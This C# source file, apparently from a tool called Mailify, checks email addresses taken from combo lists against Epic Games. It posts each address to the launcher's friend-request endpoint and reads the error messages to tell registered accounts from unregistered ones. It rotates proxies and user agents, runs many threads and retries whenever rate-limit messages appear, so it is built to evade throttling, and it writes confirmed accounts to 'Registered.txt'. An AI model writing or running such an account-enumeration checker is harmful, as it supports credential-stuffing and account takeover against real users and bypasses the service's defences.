using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class EpicGames_VM
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;


            new Thread(() => Variables.VM_title()).Start();
            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    var U_A = Http.RandomUserAgent();
                    var Epic_Device = Guid.NewGuid().ToString();
                    var EPIC_FUNNEL_ID = Functions.Resolve("?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h");
                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                    req.AddHeader("Pragma", "no-cache");
                    req.AddHeader("Accept", "*/*");
                    var res7 = req.Get("https://www.epicgames.com/id/api/csrf");
                    string text7 = res7.ToString();
                    var XSRF_TOKEN = req.Cookies.GetCookies("https://www.epicgames.com/id/api/csrf")["XSRF-TOKEN"].Value;

                    req.ClearAllHeaders();
                    req.AllowAutoRedirect = false;

                    req.AddHeader("EPIC_DEVICE", Epic_Device);
                    req.AddHeader("EPIC_FUNNEL_ID", EPIC_FUNNEL_ID);
                    req.AddHeader("XSRF-TOKEN", XSRF_TOKEN);
                    req.AddHeader("User-Agent", U_A);
                    req.AddHeader("Pragma", "no-cache");
                    req.AddHeader("Accept", "*/*");
                    req.AddHeader("Host", "accounts.launcher-website-prod07.ol.epicgames.com");
                    req.AddHeader("Accept-Language", "nb-NO,nb;q=0.9,no-NO;q=0.8,no;q=0.6,nn-NO;q=0.5,nn;q=0.4,en-US;q=0.3,en;q=0.1");
                    req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    req.AddHeader("X-XSRF-TOKEN", XSRF_TOKEN);
                    req.AddHeader("Origin", "https://accounts.launcher-website-prod07.ol.epicgames.com");
                    req.AddHeader("DNT", "1");
                    req.AddHeader("Connection", "keep-alive");
                    req.AddHeader("Referer", "https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/addFriends");

                    var res0 = req.Post("https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/sendFriendRequest", "inputEmail=" + credentials[0] + "&tab=connections", "application/x-www-form-urlencoded");
                    string text0 = res0.ToString();

                    if (text0.Contains("class=\"fieldValidationError\"><label for=\"inputEmail\" class=\"fieldValidationError\">Sorry, it appears that you have tried to submit the form twice. Please click only once.</label></div>") || text0.Contains("class=\"fieldValidationError\"><label for=\"inputEmail\" class=\"fieldValidationError\">Sorry, you are visiting our service too frequent, please try again later.</label></div>"))
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                    else if (text0.Contains("class=\"fieldValidationError\"><label for=\"inputEmail\" class=\"fieldValidationError\">Please Sign In</label></div>"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (text0.Contains("class=\"fieldValidationError\"><label for=\"inputEmail\" class=\"fieldValidationError\">Sorry, this account was not found</label></div>"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Not Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}